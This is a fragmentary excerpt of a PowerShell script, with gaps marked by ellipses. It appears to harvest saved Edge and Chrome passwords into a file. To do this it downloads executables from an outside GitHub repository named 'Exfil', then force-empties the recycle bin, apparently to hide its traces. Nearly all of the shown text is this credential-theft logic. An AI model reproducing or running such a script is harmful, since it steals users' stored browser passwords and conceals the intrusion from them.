...
Add-Content -Path “$FileName” -Value “Edge Passwords”; 
    ...
    $edgeUrl = 'https://github.com/luciferseamus/Exfil/raw/main/edge/edge.exe';
    $EdgePath = '.\edge.exe';
...
Add-Content -Path “$FileName” -Value “Chrome Passwords”;
    ...
    $chromeUrl = 'https://github.com/luciferseamus/Exfil/raw/main/chrome/chrome.exe';
...
# Empty recycle bin
Clear-RecycleBin -Force -ErrorAction SilentlyContinue;c